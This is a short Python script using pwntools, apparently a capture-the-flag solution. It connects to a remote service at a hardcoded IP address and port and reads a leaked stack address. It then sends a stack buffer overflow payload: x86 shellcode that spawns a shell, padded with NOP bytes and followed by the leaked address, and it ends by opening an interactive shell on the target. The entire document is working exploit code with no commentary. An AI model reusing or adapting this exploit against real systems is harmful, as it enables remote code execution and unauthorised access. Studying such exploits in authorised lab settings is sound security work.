from pwn import *

p = remote("23.236.125.55","10004")
line = p.recvline()
print line
begin = line.index('0x')
stack_addr = int(line[begin:-2],16)
print stack_addr
length = 0x12A + 4
shellcode=asm(shellcraft.sh(),os='linux',arch='x86')
payload = shellcode.ljust(length,'\x90') + p32(stack_addr)
p.sendline(payload)

p.interactive()

